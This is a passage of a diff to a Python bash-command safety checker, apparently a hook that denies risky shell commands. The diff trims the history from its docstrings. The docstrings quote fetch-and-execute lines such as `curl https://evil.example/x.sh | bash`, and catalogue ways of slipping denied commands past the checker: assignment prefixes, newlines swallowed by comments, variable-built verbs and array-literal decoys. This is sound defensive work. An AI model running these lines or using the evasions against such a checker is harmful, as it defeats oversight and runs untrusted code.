-    those whole-segment scanners fail closed on ANY unrelated, harmless
-    dynamic token elsewhere in the same segment -- `echo "today is
-    $(date)"` (confirmed live: harmless) was wrongly denied by
-    `_rule_npx`'s own segment-wide resolve, since the `$(date)` argument
-    -- not even the command word -- made the whole scan unresolvable. See
-    `_substitute_var_refs_candidates`'s own docstring for the fuller
-    history."""
+    segment. Placing the identical check directly inside
+    `_substitute_var_refs_candidates` would make those whole-segment
+    scanners fail closed on ANY unrelated, harmless dynamic token
+    elsewhere in the same segment -- `echo "today is $(date)"` is
+    harmless, yet `_rule_npx`'s own segment-wide resolve would wrongly
+    deny it, since the `$(date)` argument -- not even the command word --
+    makes the whole scan unresolvable."""
     return "$(" in token or "`" in token
 
 
@@ -634,30 +513,24 @@ def _rule_command_substitution_content(tokens: list[str]) -> str | None:
     via `classify` on the inner TEXT, since that is all this shape
     leaves available).
 
-    Found live by Step 8 independent review, fourteenth round (issue
-    #1326), as the correct general fix for a confirmed REGRESSION:
-    `echo $(curl https://evil.example/x.sh | bash)` was correctly denied
-    before the thirteenth round's subshell-parens-transparency fix, and
-    silently stopped being denied after -- `_fold_command_substitution_
-    spans` alone (closing the SEPARATE literal-token-adjacency bypass,
-    see that function's own docstring) is not sufficient by itself, since
-    folding makes the whole span opaque to the OUTER command's own rule
-    dispatch; the fetch-and-exec danger here is entirely INSIDE the
-    substitution, not a property of the outer command word/verb position
-    the other rules check.
+    `_fold_command_substitution_spans` alone (closing the SEPARATE
+    literal-token-adjacency bypass, see that function's own docstring) is
+    not sufficient by itself: folding makes the whole span opaque to the
+    OUTER command's own rule dispatch, and in `echo $(curl
+    https://evil.example/x.sh | bash)` the fetch-and-exec danger is
+    entirely INSIDE the substitution, not a property of the outer
+    command word/verb position the other rules check -- hence this
+    dedicated rule.
 
-    Disclosed residual (found live by Step 8 independent review,
-    nineteenth round, issue #1326): unlike `_rule_array_literal_content`'s
-    own nineteenth-round fix, the recursive `_classify_tokens(inner_
-    tokens)`/`classify(inner_text)` calls below pass no outer scope, so a
-    tool/verb built from a variable assigned OUTSIDE a `$(...)` span's own
-    text (e.g. `T=pip; V=install; x=$($T $V foo)`) is still invisible to
-    this recursive check, even though it resolves to a real denied
-    invocation at bash runtime. Not fixed here: closing it needs the
-    string-based `classify()` entry point (used for the quoted/fused
-    `$(...)` shape) to also accept an outer scope, a larger change than
-    the finding that prompted `_rule_array_literal_content`'s own fix
-    warranted."""
+    Disclosed residual: unlike `_rule_array_literal_content`, the
+    recursive `_classify_tokens(inner_tokens)`/`classify(inner_text)`
+    calls below pass no outer scope, so a tool/verb built from a variable
+    assigned OUTSIDE a `$(...)` span's own text (e.g. `T=pip; V=install;
+    x=$($T $V foo)`) is still invisible to this recursive check, even
+    though it resolves to a real denied invocation at bash runtime. Not
+    fixed here: closing it needs the string-based `classify()` entry
+    point (used for the quoted/fused `$(...)` shape) to also accept an
+    outer scope, a larger change than the gap warrants."""
     i = 0
     n = len(tokens)
     while i < n:
@@ -671,9 +544,8 @@ def _rule_command_substitution_content(tokens: list[str]) -> str | None:
             start, end = fused
             inner_text = tokens[i][start + 2 : end - 1]
             # Deliberately plain `.strip()`, NOT `.strip(_BASH_DEFAULT_IFS)`
-            # -- considered during Step 8 independent review, twenty-
-            # seventh round (issue #1326), and left as-is: see the main
-            # hook's own identical decision, ported here for consistency.
+            # -- matches the main hook's own identical decision, ported
+            # here for consistency.
             if inner_text.strip():
                 inner_verdict = classify(inner_text)
                 if inner_verdict.deny:
@@ -703,24 +575,21 @@ def _strip_comments(command: str) -> str:
     unquoted `#` sitting at a bash WORD-BOUNDARY position, up to (but NOT
     including) the next raw newline, or the end of COMMAND if there is no
     further newline. Ported from hooks/gitapex_check_bash_safety.py's own
-    function of the same name -- see that module's own docstring (issue
-    #1350) for the full live-verified word-boundary/quoting/escaping
-    rules this implements and why it must run BEFORE `_strip_line_
-    continuations` (and before shlex, which this module also stops
-    telling about `#` at all -- see `tokenize()`'s own docstring) on the
-    fully raw command text.
+    function of the same name -- see that module's own docstring for the
+    full word-boundary/quoting/escaping rules this implements and why it
+    must run BEFORE `_strip_line_continuations` (and before shlex, which
+    this module also stops telling about `#` at all -- see `tokenize()`'s
+    own docstring) on the fully raw command text.
 
-    Found live during independent adversarial review of issue #1350's own
-    newline fix: shlex's own default `commenters` (`'#'`) makes an
-    unquoted `#` at a word boundary consume everything up to and
-    INCLUDING the next newline as an inert comment, silently discarding
-    that newline too -- reopening the identical newline-collapse bug this
-    issue exists to close, just routed through `#` instead of a bare
-    newline. Confirmed live directly against THIS module's own
-    `classify()`: `VERB=install; echo hi #x` + a real newline + `pip
-    $VERB foo` (two real bash statements, the second confirmed live to
-    genuinely reach `pip install foo`) tokenized with no trace of the
-    separating newline at all before this fix, returning `deny=False`."""
+    shlex's own default `commenters` (`'#'`) makes an unquoted `#` at a
+    word boundary consume everything up to and INCLUDING the next newline
+    as an inert comment, silently discarding that newline too --
+    reopening the identical newline-collapse gap the newline handling
+    exists to close, just routed through `#` instead of a bare newline:
+    `VERB=install; echo hi #x` + a real newline + `pip $VERB foo` is two
+    real bash statements, the second genuinely reaching `pip install
+    foo`, yet with shlex's commenter left enabled it tokenizes with no
+    trace of the separating newline at all, returning `deny=False`."""
     out: list[str] = []
     in_single_quote = False
     in_double_quote = False
@@ -781,8 +650,8 @@ def _strip_line_continuations(command: str) -> str:
     """Delete every bash line-continuation pair (an unescaped `\\` directly
     followed by a real newline) from COMMAND, outside single-quoted spans.
     Ported from hooks/gitapex_check_bash_safety.py's own function of the
-    same name -- see that module's own docstring for the full live-
-    verification history (issue #1350) of why this raw, character-level
+    same name -- see that module's own docstring for the full reasoning
+    on why this raw, character-level
     preprocessing pass must run BEFORE shlex ever sees the text (Python's
     posix-mode shlex treats `\\<newline>` as a generic escaped-character
     pair, keeping the newline CHARACTER verbatim in the token, unlike real
@@ -836,43 +705,38 @@ def tokenize(command: str) -> list[str]:
     `_rule_command_substitution_content` against these still-unfolded
     tokens, which needs each span's own inner tokens still separable.
 
-    Closed by issue #1350, ported from the sibling module's own fix of the
-    same finding: `segment_tokens`'s own `_SINGLE_OPS` set was written from
-    the start to include a literal newline, showing clear intent to treat
-    it as a real bash statement separator exactly like `;` -- but this
-    function's own shlex configuration silently absorbed a bare newline as
-    ordinary whitespace instead of ever emitting it as a token, making that
-    `"\\n"` member unreachable dead code. Live-verified directly against
-    THIS module's own `classify()` (issue #1350's own reproduction notes):
-    `echo hi\\ngh pr merge 1` (two real bash statements on separate lines)
-    returned `deny=False` here, since this module's `gh`-detection
-    (`_rule_gh_any`) is purely `seg[0]`-anchored with no phrase-list
-    adjacency fallback the way the sibling module's own `_rule_a_literal`
-    has (by design, per that rule's own docstring: `gh` is an absolute
-    deny here, not a narrower phrase match) -- `gh` sat at index 2 of one
-    flat 6-token segment once the newline was silently absorbed, never at
-    `seg[0]`, so the rule never fired. Same shape affects `_rule_bare_
-    install`. Closed the same two ways together as the sibling module (see
-    that module's own `tokenize()` docstring for the full live-verified
-    reasoning): `_strip_line_continuations` above removes every genuine
+    A bare newline is a real bash statement separator exactly like `;`
+    (`segment_tokens`'s own `_SINGLE_OPS` set includes a literal newline
+    for exactly that reason), but shlex's default configuration silently
+    absorbs a bare newline as ordinary whitespace instead of ever
+    emitting it as a token -- leaving that `"\\n"` member unreachable.
+    `echo hi\\ngh pr merge 1` (two real bash statements on separate
+    lines) would then collapse into one flat 6-token segment: this
+    module's `gh`-detection (`_rule_gh_any`) is purely `seg[0]`-anchored
+    with no phrase-list adjacency fallback the way the sibling module's
+    own `_rule_a_literal` has (by design, per that rule's own docstring:
+    `gh` is an absolute deny here, not a narrower phrase match), so `gh`
+    sitting at index 2, never at `seg[0]`, means the rule never fires.
+    The same shape affects `_rule_bare_install`. Handled the same two
+    ways as the sibling module (see that module's own `tokenize()`
+    docstring): `_strip_line_continuations` above removes every genuine
     line-continuation from the raw source first, and the lexer below is
-    constructed with an explicit `punctuation_chars` string (instead of the
-    `True` shortcut) with `\\n` also removed from its own `whitespace`
-    attribute, turning every remaining raw newline into its own recognized
-    operator token instead of silently-absorbed whitespace.
+    constructed with an explicit `punctuation_chars` string (instead of
+    the `True` shortcut) with `\\n` also removed from its own
+    `whitespace` attribute, turning every remaining raw newline into its
+    own recognized operator token instead of silently-absorbed
+    whitespace.
 
-    Found live during independent adversarial review of this same fix,
-    ported from the sibling module's own fix of the same finding: shlex's
-    own default `commenters` (`'#'`) reopens the identical bug class via
-    a different route -- an unquoted `#` at a word boundary makes shlex
-    consume everything up to and INCLUDING the next newline as an inert
-    comment, silently discarding that newline too. Closed by `_strip_
-    comments` above, run FIRST (before `_strip_line_continuations`, on
-    the still-fully-raw command text) with `lexer.commenters` explicitly
-    cleared below, so comment semantics are owned exclusively by `_strip_
-    comments` from here on -- see that function's and the sibling
-    module's own `tokenize()` docstring for the full live-verified
-    reasoning."""
+    shlex's own default `commenters` (`'#'`) reopens the identical gap
+    via a different route -- an unquoted `#` at a word boundary makes
+    shlex consume everything up to and INCLUDING the next newline as an
+    inert comment, silently discarding that newline too. Handled by
+    `_strip_comments` above, run FIRST (before
+    `_strip_line_continuations`, on the still-fully-raw command text)
+    with `lexer.commenters` explicitly cleared below, so comment
+    semantics are owned exclusively by `_strip_comments` from here on --
+    see that function's and the sibling module's own `tokenize()`
+    docstring for the full reasoning."""
     command = _strip_comments(command)
     command = _strip_line_continuations(command)
     try:
@@ -917,64 +781,54 @@ def _pipe_chains(tokens: list[str]) -> list[list[list[str]]]:
     versus "a new, unrelated statement," which is exactly the
     distinction that rule needs.
 
-    Found live by Step 8 independent review, twelfth round (issue
-    #1326): the pre-fix `_rule_fetch_exec` iterated `segment_tokens`'s
-    flat list and unconditionally stopped after checking only the ONE
-    segment immediately following the fetch command, regardless of which
-    operator separated them -- confirmed live via real bash (`cat
-    <script> | cat | bash` genuinely executes the script; `curl <url> |
-    cat | bash` is functionally identical) that a passthrough stage
-    defeated detection entirely, while the SAME operator-blind design
-    also produced a false positive in the other direction: `curl <url>;
-    bash unrelated.sh` -- a plain SEQUENCED statement, not a pipe at all
-    -- was wrongly denied, since `;` and `|` were never distinguished.
+    An operator-blind design that checks only the ONE segment
+    immediately following the fetch command, regardless of which
+    operator separated them, fails in both directions: a passthrough
+    stage defeats detection entirely (`cat <script> | cat | bash`
+    genuinely executes the script under real bash; `curl <url> | cat |
+    bash` is functionally identical), while `curl <url>; bash
+    unrelated.sh` -- a plain SEQUENCED statement, not a pipe at all --
+    is wrongly denied when `;` and `|` are never distinguished.
 
     `(`/`)` are treated as TRANSPARENT -- skipped outright, never
     breaking a chain -- not lumped in with the statement-separator
     operators above, even though `segment_tokens` itself does group them
-    that way for its own, different purpose. Found live by Step 8
-    independent review, thirteenth round (issue #1326): `(`/`)` are
-    bash's own SUBSHELL grouping syntax, not a statement separator -- a
-    subshell's combined stdout still flows to whatever follows its
-    closing `)` piped onward, so `(curl <url> | cat) | bash` (confirmed
-    live via a real bash proxy: `(echo payload | cat) | bash` genuinely
-    runs the piped-through payload) is one continuous pipe from `curl`'s
-    own perspective, not two separate, unconnected ones. Treating `(`/`)`
-    the same as `;`/`&`/`&&`/`||` (the pre-fix version's own mistake)
-    silently split that one real chain into two, so `_rule_fetch_exec`
-    never saw `bash` as a later segment of the chain containing `curl`
-    at all.
+    that way for its own, different purpose: `(`/`)` are bash's own
+    SUBSHELL grouping syntax, not a statement separator -- a subshell's
+    combined stdout still flows to whatever follows its closing `)`
+    piped onward, so `(curl <url> | cat) | bash` (`(echo payload | cat)
+    | bash` genuinely runs the piped-through payload under real bash) is
+    one continuous pipe from `curl`'s own perspective, not two separate,
+    unconnected ones. Treating `(`/`)` the same as `;`/`&`/`&&`/`||`
+    would silently split that one real chain into two, so
+    `_rule_fetch_exec` would never see `bash` as a later segment of the
+    chain containing `curl` at all.
 
-    Two further findings closed by Step 8 independent review, fourteenth
-    round (issue #1326), both in this same area:
+    Two further shapes in this same area:
 
     (1) `|&` (bash's own shorthand for piping BOTH stdout and stderr)
     tokenizes as two adjacent tokens `|` then `&` (see `_split_punct_run`
-    -- `|&` is not a recognized 2-char operator the way `&&`/`||` are), so
-    the pre-fix version's flat per-token loop treated the trailing `&` as
-    an ordinary statement-separator, wrongly breaking the chain right
-    where `|&` continues it: `curl <url> |& bash` (confirmed live via a
-    real bash proxy that `|&` genuinely pipes stdout through, same as a
-    real fetch payload would) went undetected. Closed by consuming the
-    following `&` as part of the same `|` when the two are adjacent,
-    instead of letting it fall through to the generic operator branch.
+    -- `|&` is not a recognized 2-char operator the way `&&`/`||` are).
+    A flat per-token loop would treat the trailing `&` as an ordinary
+    statement-separator, wrongly breaking the chain right where `|&`
+    continues it -- `curl <url> |& bash` genuinely pipes stdout through,
+    same as a real fetch payload would -- so the following `&` is
+    consumed as part of the same `|` when the two are adjacent, instead
+    of falling through to the generic operator branch.
 
-    (2) The thirteenth round's own subshell-transparency fix made `(`/`)`
-    transparent to CHAIN-BREAKING, but never distinguished a statement
-    separator found INSIDE an unclosed subshell from one found at the top
-    level -- so `(curl <url>; true) | bash` (confirmed live via a real
-    bash proxy -- `(echo payload; true) | bash` genuinely runs the
-    piped-through payload, since a subshell's stdout is the concatenation
-    of every statement it runs, sequenced or not) still broke into two
-    unconnected chains at the internal `;`, the same false negative the
-    thirteenth round's own fix was meant to close for `|` specifically.
-    Closed by tracking paren-nesting depth: a statement-separator found
-    while DEPTH > 0 (inside an unclosed subshell) now starts a new
-    SEGMENT in the SAME chain (the same treatment `|` already gets),
-    never a new chain outright -- only a depth-0 separator still breaks
-    to an unrelated chain, preserving the existing, deliberate false-
-    positive fix for `curl <url>; bash unrelated.sh` (a plain sequenced
-    statement, not a subshell, stays two separate chains)."""
+    (2) A statement separator found INSIDE an unclosed subshell must be
+    distinguished from one found at the top level: `(curl <url>; true) |
+    bash` is still one connected chain (`(echo payload; true) | bash`
+    genuinely runs the piped-through payload under real bash, since a
+    subshell's stdout is the concatenation of every statement it runs,
+    sequenced or not). Paren-nesting depth is tracked so a
+    statement-separator found while DEPTH > 0 (inside an unclosed
+    subshell) starts a new SEGMENT in the SAME chain (the same treatment
+    `|` already gets), never a new chain outright -- only a depth-0
+    separator still breaks to an unrelated chain, preserving the
+    deliberate false-positive handling of `curl <url>; bash
+    unrelated.sh` (a plain sequenced statement, not a subshell, stays
+    two separate chains)."""
     chains: list[list[list[str]]] = [[[]]]
     depth = 0
     i = 0
@@ -1015,8 +869,7 @@ def _assigned_literals(tokens: list[str]) -> dict[str, str]:
     whether some assignment anywhere in the whole command happens to
     supply a matching value -- see
     _rule_b1b_dynamic_word_assigned_tool_and_verb's own docstring for the
-    false positive this closes (found live by Step 8 independent review,
-    issue #1326)."""
+    false positive this closes."""
     values: dict[str, str] = {}
     for token in tokens:
         if _is_dynamic(token):
@@ -1037,7 +890,7 @@ def _assigned_raw_values(tokens: list[str]) -> dict[str, str]:
     names are case-sensitive), not compared case-insensitively against a
     known tool/verb literal the way `_assigned_literals`'s own lowercased
     values are used everywhere else in this module. Ported from
-    hooks/gitapex_check_bash_safety.py's own fix of the same finding."""
+    hooks/gitapex_check_bash_safety.py's own function of the same name."""
     values: dict[str, str] = {}
     for token in tokens:
         if _is_dynamic(token):
@@ -1068,36 +921,31 @@ def _strip_leading_assignments(seg: list[str]) -> list[str]:
     than the command word; `_ASSIGN_RE`'s own `(.*)$` capture already
     matches a `$`-containing RHS just as readily as a literal one.
 
-    Found live by Step 8 independent review, fifteenth round (issue
-    #1326): NONE of `_rule_gh_any`, `_rule_bare_install`, `_rule_fetch_
-    exec`, `_rule_process_sub_fetch_exec`, `_rule_eval_or_dashc_fetch_
-    exec`, `_rule_b1a_dynamic_word_same_segment_verb`/`_rule_b1b_dynamic_
-    word_assigned_tool_and_verb` (both gated on `_is_dynamic(seg[0])` as
-    their own first check), or `_rule_b2_watched_tool_dynamic_verb_
-    position` accounted for this at all -- `X=foo gh pr merge 1`, `X=foo
-    pnpm`, `X=foo curl <url> | bash`, `X=foo bash <(curl <url>)`, and
-    `X=foo eval $(curl <url>)` (every one confirmed live via a real bash
-    proxy with a stand-in binary on PATH, capturing its own argv and
-    environment) all fully bypassed this module's own absolute `gh`/
-    fetch-exec detection with NO indirection technique at all -- the
-    denied tool name is present as its own untouched literal token in the
-    command, simply not at index 0. This is NOT the module's own
-    disclosed Stage 1 ceiling ("verb reconstruction that never places the
-    tool or verb name as its own literal token anywhere in the command")
-    -- it contradicts that closure claim rather than falling within its
-    stated boundary, and predates this round's own work entirely
-    (confirmed via `git show fab856a:...` against the very first Stage 1
-    commit: `X=foo gh pr merge 1` was never denied).
+    Without this strip, NONE of `_rule_gh_any`, `_rule_bare_install`,
+    `_rule_fetch_exec`, `_rule_process_sub_fetch_exec`, `_rule_eval_or_
+    dashc_fetch_exec`, `_rule_b1a_dynamic_word_same_segment_verb`/`_rule_
+    b1b_dynamic_word_assigned_tool_and_verb` (both gated on
+    `_is_dynamic(seg[0])` as their own first check), or `_rule_b2_
+    watched_tool_dynamic_verb_position` accounts for the prefix at all --
+    `X=foo gh pr merge 1`, `X=foo pnpm`, `X=foo curl <url> | bash`,
+    `X=foo bash <(curl <url>)`, and `X=foo eval $(curl <url>)` (each
+    genuinely reaching the real tool's argv under bash) would all bypass
+    this module's own absolute `gh`/fetch-exec detection with NO
+    indirection technique at all -- the denied tool name is present as
+    its own untouched literal token in the command, simply not at index
+    0. That is NOT within the module's own disclosed Stage 1 ceiling
+    ("verb reconstruction that never places the tool or verb name as its
+    own literal token anywhere in the command") -- it would contradict
+    that closure claim rather than fall within its stated boundary.
 
     Rules that instead scan a WHOLE segment for a literal match
     regardless of position (`_rule_a_literal`'s adjacency scan, `_rule_
     npx`'s literal branch, `_is_git_push_segment`'s own literal-`git`-
-    anywhere scan) were never affected by this gap -- confirmed live
-    that `X=foo pip install foo`, `X=foo git push origin main`, and
-    `X=foo npx left-pad` were ALREADY correctly denied before this fix,
-    which is why this strip is applied via `segments`/`pipe_chains`
-    (feeding every rule uniformly) rather than requiring those
-    already-correct rules to change.
+    anywhere scan) never had this gap -- `X=foo pip install foo`, `X=foo
+    git push origin main`, and `X=foo npx left-pad` are correctly denied
+    by them with or without the strip -- which is why the strip is
+    applied via `segments`/`pipe_chains` (feeding every rule uniformly)
+    rather than requiring those already-correct rules to change.
 
     A folded array-literal token (see `_fold_array_literal_spans`) also
     reaches this function `NAME=`-prefixed and gets stripped the same
@@ -1109,8 +957,7 @@ def _strip_leading_assignments(seg: list[str]) -> list[str]:
     BEFORE this function ever runs, so this function discarding the
     (already-checked) folded token costs no coverage -- content-safety
     and this function's own "make `seg[0]` mean the real command word"
-    job are fully decoupled (Step 8 independent review, eighteenth
-    round, issue #1326)."""
+    job are fully decoupled."""
     i = 0
     n = len(seg)
     while i < n and _ASSIGN_RE.match(seg[i]):
@@ -1161,14 +1008,12 @@ def _fold_array_literal_spans(tokens: list[str]) -> list[str]:
     it -- and if that segment's own FIRST token happens to be an
     unresolvable dynamic one, indistinguishable, to every `seg[0]`-
     anchored fail-closed rule, from an attempted command invocation with
-    an obfuscated command word (confirmed live: `files=($(ls *.txt))`
-    was wrongly denied before this fold existed at all, Step 8
-    independent review, fifteenth round, issue #1326).
+    an obfuscated command word (`files=($(ls *.txt))`, an ordinary idiom,
+    would be wrongly denied without this fold).
 
     Folds EVERY array-literal span unconditionally -- dynamic or fully
-    literal content alike -- deliberately simpler than three earlier,
-    narrower designs this function went through and then abandoned (see
-    Design history below): this fold's own downstream effect on
+    literal content alike -- deliberately simpler than the narrower
+    alternatives discussed below: this fold's own downstream effect on
     `_strip_leading_assignments` (making the array's own elements
     invisible to every `seg[0]`-anchored or whole-segment rule once
     discarded as an "inert" assignment) is now SAFE regardless of what
@@ -1180,43 +1025,38 @@ def _fold_array_literal_spans(tokens: list[str]) -> list[str]:
     spans`/`_rule_command_substitution_content` already established for
     `$(...)` spans. This function's only remaining job is protecting
     `seg[0]`-anchored rules from an unresolvable-dynamic false positive;
-    it no longer has ANY responsibility for content-safety at all --
-    `_pipe_chains`'s own now-removed seventeenth-round special case
-    (segment-breaking a literal array's own boundary, to keep its
-    content visible when left unfolded) is no longer needed either, for
-    the same reason: an unconditionally-folded array literal never
-    reaches `_pipe_chains` as raw, unfolded `(`/`)` tokens at all.
+    it no longer has ANY responsibility for content-safety at all -- and
+    a `_pipe_chains` special case (segment-breaking a literal array's
+    own boundary, to keep its content visible when left unfolded) is not
+    needed either, for the same reason: an unconditionally-folded array
+    literal never reaches `_pipe_chains` as raw, unfolded `(`/`)` tokens
+    at all.
 
-    Design history (Step 8 independent review, issue #1326), ported from
-    the main hook's own identical history: sixteenth round folded
-    unconditionally too, but `_strip_leading_assignments` alone
-    discarded a folded LITERAL span's own content with no recursive
-    check to catch it first -- `A=(gh pr merge 1); "${A[@]}"` was
-    wrongly ALLOWED. Fixed (that round) by leaving a fully-literal span
-    unfolded. Seventeenth round found that "any element dynamic" folded
-    a MIXED span too eagerly, still hiding a literal denied verb sitting
-    next to one unrelated dynamic element -- narrowed to "fold only if
-    the FIRST element is dynamic," and separately taught `_pipe_chains`
-    to segment-break a literal array's own boundary instead of treating
-    it as a transparent subshell. Eighteenth round found that narrower
-    fold condition STILL wrongly allowed `A=($NEVERSET gh pr merge 1);
-    "${A[@]}"` (confirmed live, real bash: an UNQUOTED reference to a
-    variable never assigned anywhere in the command word-splits away to
-    NOTHING at real bash runtime, so `gh` genuinely becomes the array's
-    own REAL first element once expanded -- verified via `declare -p`
-    that `A=($NEVERSET gh pr merge 1)` produces a 4-element array `(gh
-    pr merge 1)`, NEVERSET contributing nothing at all) -- folding on
-    "first element dynamic" hid this exactly the same way sixteenth
-    round's unconditional fold did, since the fold's own boundary
-    detection has no way to know a dynamic-looking first element might
-    not even survive to runtime. Rather than continue narrowing the fold
-    condition against an open-ended set of shapes that can defeat any
-    purely fold-side heuristic, eighteenth round added the independent
-    recursive content check instead, reverted this function to its
-    simplest form (unconditional folding), and removed `_pipe_chains`'s
-    own seventeenth-round special case entirely, since the content check
-    makes both the fold's own behavior AND `_pipe_chains`'s own
-    treatment of an array literal's boundary irrelevant to safety.
+    Why the narrower fold conditions fail (matching the main hook's own
+    identical reasoning): unconditional folding WITHOUT a recursive
+    content check lets `_strip_leading_assignments` discard a folded
+    LITERAL span's own content unchecked -- `A=(gh pr merge 1);
+    "${A[@]}"` would be wrongly ALLOWED. Leaving a fully-literal span
+    unfolded, or folding whenever ANY element is dynamic, folds a MIXED
+    span too eagerly, still hiding a literal denied verb sitting next to
+    one unrelated dynamic element. Narrowing further to "fold only if
+    the FIRST element is dynamic" (with `_pipe_chains` segment-breaking
+    a literal array's own boundary) STILL wrongly allows `A=($NEVERSET
+    gh pr merge 1); "${A[@]}"`: at real bash runtime, an UNQUOTED
+    reference to a variable never assigned anywhere in the command
+    word-splits away to NOTHING, so `gh` genuinely becomes the array's
+    own REAL first element once expanded (`declare -p` shows
+    `A=($NEVERSET gh pr merge 1)` producing a 4-element array `(gh pr
+    merge 1)`, NEVERSET contributing nothing at all) -- the fold's own
+    boundary detection has no way to know a dynamic-looking first
+    element might not even survive to runtime. Rather than narrowing the
+    fold condition against an open-ended set of shapes that can defeat
+    any purely fold-side heuristic, the independent recursive content
+    check carries all content-safety, this function keeps its simplest
+    form (unconditional folding), and `_pipe_chains` carries no
+    array-boundary special case, since the content check makes both the
+    fold's own behavior AND `_pipe_chains`'s own treatment of an array
+    literal's boundary irrelevant to safety.
 
     The array's own inner elements are joined WITH spaces, the opener
     (`NAME=` plus `(`) and closer (`)`) joined with NO separator --
@@ -1249,11 +1089,9 @@ def _fold_array_literal_spans(tokens: list[str]) -> list[str]:
 # docstring for why those must NOT be treated as vanishing. NAMED groups
 # (`bare`/`braced`), not positional -- `_REF_RUN_NAME_RE` below is this
 # SAME pattern, unquantified, so its own two alternatives can never
-# silently drift out of sync with `_REF_RUN_TOKEN_RE`'s (a future round
-# extending one and forgetting the other, found live by Step 8
-# independent review, twenty-first round, issue #1326) -- there is only
-# ever one definition to extend. Named `_SRC`, not `_RE` (found live by
-# the same round's own independent review): this is regex SOURCE TEXT, a
+# silently drift out of sync with `_REF_RUN_TOKEN_RE`'s (a future edit
+# extending one and forgetting the other) -- there is only ever one
+# definition to extend. Named `_SRC`, not `_RE`: this is regex SOURCE TEXT, a
 # plain `str` interpolated into `_REF_RUN_TOKEN_RE` below, never itself
 # compiled or called -- every OTHER `_RE`-suffixed name in this module
 # (`_ASSIGN_RE`, `_VAR_REF_FULL_RE`, `_REF_RUN_TOKEN_RE`/`_REF_RUN_NAME_RE`
@@ -1265,9 +1103,7 @@ _ONE_REF_SRC = r"\$(?P<bare>[A-Za-z_][A-Za-z0-9_]*)|\$\{(?P<braced>[A-Za-z_][A-Z
 # of the shape above -- no other character anywhere in the token. A named
 # group repeated under a quantifier is valid Python `re` syntax (the name
 # is defined once, syntactically, regardless of how many times `+`
-# repeats it at match time) -- confirmed live that this matches/finditers
-# identically to the pre-unification two-regex form across every shape
-# `_token_is_all_unassigned_refs`'s own tests exercise.
+# repeats it at match time).
 _REF_RUN_TOKEN_RE = re.compile(rf"^(?:{_ONE_REF_SRC})+$")
 # The individual references within such a token, captured for the
 # unassigned-name check -- group("bare") for the bare form, group(
@@ -1277,13 +1113,10 @@ _REF_RUN_NAME_RE = re.compile(_ONE_REF_SRC)
 # refs` to decide whether an assigned-but-all-whitespace value word-splits
 # away to nothing the same way an assigned-empty one does. Deliberately
 # NARROWER than Python's own `str.strip()` default whitespace set (which
-# also strips `\r`/`\f`/`\v`/`\x1c`-`\x1f` and more) -- found live by Step
-# 8 independent review, twenty-sixth round (issue #1326), ported from the
-# main hook's own identical fix: confirmed live via real bash that
+# also strips `\r`/`\f`/`\v`/`\x1c`-`\x1f` and more): under real bash,
 # `CFG=$'\r'; git -v $CFG push origin main` does NOT word-split `$CFG`
-# away, contradicting `_token_is_all_unassigned_refs`'s own docstring,
-# which explicitly names "space/tab/newline" as the default IFS this
-# check relies on.
+# away -- bash's default IFS is exactly space/tab/newline, so stripping
+# Python's broader set would wrongly treat such a value as vanishing.
 _BASH_DEFAULT_IFS = " \t\n"
 
 
@@ -1295,18 +1128,17 @@ def _token_is_all_unassigned_refs(token: str, name_to_raw_value: dict[str, str])
     bare and plain-braced (no subscript) forms, this covers a NAME
     never assigned anywhere in this command AND a NAME assigned a value
     that is itself empty or ALL of bash's own (not Python's broader)
-    IFS whitespace (see the twenty-fourth/twenty-fifth/twenty-sixth-
-    round paragraphs below for why); the subscripted form stays
+    IFS whitespace (see below for why); the subscripted form stays
     narrower (never-assigned only -- see that same discussion for
-    why). Confirmed live via `declare -p` against real bash for both
-    shapes this generalizes over: `A=($NEVERSET gh pr merge 1)` (a single
-    bare reference) and `A=(${NEVERSET[0]} gh pr merge 1)` (a braced
+    why). Under real bash, the shapes this generalizes over behave
+    identically: `A=($NEVERSET gh pr merge 1)` (a single bare
+    reference) and `A=(${NEVERSET[0]} gh pr merge 1)` (a braced
     subscript reference) both produce the identical 4-element array `(gh
-    pr merge 1)`, the reference contributing zero elements either way --
-    and `A=($A_UNSET$B_UNSET gh pr merge 1)` (TWO fused bare references,
-    each independently unset) produces the same 4-element array too, the
-    whole fused token collapsing to nothing as a unit. Ported from the
-    main hook's own twentieth-round fix of the same finding.
+    pr merge 1)` per `declare -p`, the reference contributing zero
+    elements either way -- and `A=($A_UNSET$B_UNSET gh pr merge 1)` (TWO
+    fused bare references, each independently unset) produces the same
+    4-element array too, the whole fused token collapsing to nothing as
+    a unit. Ported from the main hook's own function of the same name.
 
     Deliberately narrower than `_substitute_var_refs_candidates`'s own
     general candidate enumeration: a default-clause (`${NAME:-default}`)
@@ -1318,45 +1150,38 @@ def _token_is_all_unassigned_refs(token: str, name_to_raw_value: dict[str, str])
     matched by `_ONE_REF_SRC`, so neither is ever treated as a vanishing
     element here.
 
-    Found live by Step 8 independent review, twentieth round (issue
-    #1326): the nineteenth round's own `_BARE_VAR_REF_RE` matched only a
-    SINGLE bare-or-braced reference occupying the WHOLE token, missing
-    two other shapes that word-split away to nothing the identical way --
-    a braced array-element subscript to an unassigned NAME (`${NEVERSET
-    [0]}`), and two-or-more bare/braced references FUSED into one token
-    with nothing else between them (`$A$B`, both unassigned). Either
-    shape defeated the eighteenth/nineteenth-round collapse entirely,
-    hiding fully literal denied-tool content sitting right after the
-    decoy from `_rule_gh_any`/`_rule_bare_install` -- both purely
-    position-anchored in this file, with no literal-adjacency fallback
-    the way `_rule_a_literal` has. Replaces the prior single-reference-
-    shaped `_BARE_VAR_REF_RE` with this general "whole token is a run of
-    one or more vanishing references" check, closing both shapes (and
-    any further fusion of the same two reference forms) with one
-    mechanism instead of chasing each new decoy shape with a narrower
-    regex extension.
+    A regex matching only a SINGLE bare-or-braced reference occupying
+    the WHOLE token would miss two other shapes that word-split away to
+    nothing the identical way -- a braced array-element subscript to an
+    unassigned NAME (`${NEVERSET[0]}`), and two-or-more bare/braced
+    references FUSED into one token with nothing else between them
+    (`$A$B`, both unassigned). Either shape would defeat the collapse
+    entirely, hiding fully literal denied-tool content sitting right
+    after the decoy from `_rule_gh_any`/`_rule_bare_install` -- both
+    purely position-anchored in this file, with no literal-adjacency
+    fallback the way `_rule_a_literal` has. Hence this general "whole
+    token is a run of one or more vanishing references" check, closing
+    both shapes (and any further fusion of the same two reference forms)
+    with one mechanism instead of chasing each new decoy shape with a
+    narrower regex extension.
 
-    ALSO fixes a bug the twentieth round's own independent review found
-    in the prior regex: `_BARE_VAR_REF_RE`'s independently-optional
-    opening/closing brace (`\\{?`/`\\}?`) accepted a MISMATCHED brace
